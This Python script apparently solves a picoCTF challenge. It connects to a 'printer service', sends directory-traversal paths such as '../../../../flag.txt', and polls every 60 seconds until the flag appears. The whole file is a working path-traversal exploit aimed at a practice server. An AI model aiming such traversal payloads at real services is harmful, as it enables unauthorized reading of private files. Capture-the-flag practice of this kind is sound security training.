import socket
import time

HOST = "dolphin-cove.picoctf.net"
PORT =  57099

printers = [b"1\n", b"2\n"]
paths = [
    b"../../../../flag.txt\n",
    b"../../../../flag\n",
    b"../../../flag.txt\n",
    b"../../../flag\n"
]

while True:
    try:
        print("[+] Connecting to printer service...")
        s = socket.socket()
        s.settimeout(10)
        s.connect((HOST, PORT))

        for printer in printers:
            s.sendall(printer)
            time.sleep(1)

            for path in paths:
                s.sendall(path)
                time.sleep(1)

                try:
                    data = s.recv(4096)
                    if data:
                        text = data.decode(errors="ignore")
                        print(text)

                        if "picoCTF{" in text:
                            print("\nFLAG FOUND:")
                            print(text)
                            exit()

                except socket.timeout:
                    pass

        s.close()

        print("[*] Waiting for next cron cycle (60s)...\n")
        time.sleep(60)

    except Exception as e:
        print("Retrying...", e)
        time.sleep(5)